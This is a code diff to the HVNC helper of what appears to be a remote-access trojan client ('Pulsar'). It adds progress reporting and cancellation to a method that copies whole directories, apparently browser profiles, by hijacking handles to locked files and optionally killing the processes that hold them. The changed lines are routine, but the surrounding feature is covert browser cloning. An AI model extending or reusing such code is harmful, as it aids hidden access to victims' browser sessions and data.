@@ -4,6 +4,8 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Linq;
+using System.Threading;
 
 namespace Pulsar.Client.Helper.HVNC
 {
@@ -517,7 +519,7 @@ namespace Pulsar.Client.Helper.HVNC
         /// <summary>
         /// Copies an entire directory using handle hijacking for locked files
         /// </summary>
-        public static bool ForceCopyDirectory(string sourceDir, string destDir, bool killIfFailed = false)
+        public static bool ForceCopyDirectory(string sourceDir, string destDir, bool killIfFailed = false, IProgress<BrowserCloneProgress> progress = null, CancellationToken cancellationToken = default)
         {
             try
             {
@@ -528,8 +530,23 @@ namespace Pulsar.Client.Helper.HVNC
 
                 Directory.CreateDirectory(destDir);
 
-                foreach (string file in Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories))
+                var files = new List<string>();
+
+                foreach (string file in Directory.EnumerateFiles(sourceDir, "*", SearchOption.AllDirectories))
                 {
+                    cancellationToken.ThrowIfCancellationRequested();
+                    files.Add(file);
+                }
+
+                int totalFiles = files.Count;
+                int processed = 0;
+
+                progress?.Report(new BrowserCloneProgress(0, totalFiles, string.Empty, totalFiles == 0));
+
+                foreach (string file in files)
+                {
+                    cancellationToken.ThrowIfCancellationRequested();
+
                     string relativePath = file.Substring(sourceDir.Length).TrimStart(Path.DirectorySeparatorChar);
                     string destFile = Path.Combine(destDir, relativePath);
 
@@ -543,7 +560,12 @@ namespace Pulsar.Client.Helper.HVNC
                     {
                         ForceCopyFile(file, destFile, killIfFailed);
                     }
+
+                    processed++;
+                    progress?.Report(new BrowserCloneProgress(processed, totalFiles, relativePath));
                 }
+
+                progress?.Report(new BrowserCloneProgress(totalFiles, totalFiles, string.Empty));
 
                 return true;
             }
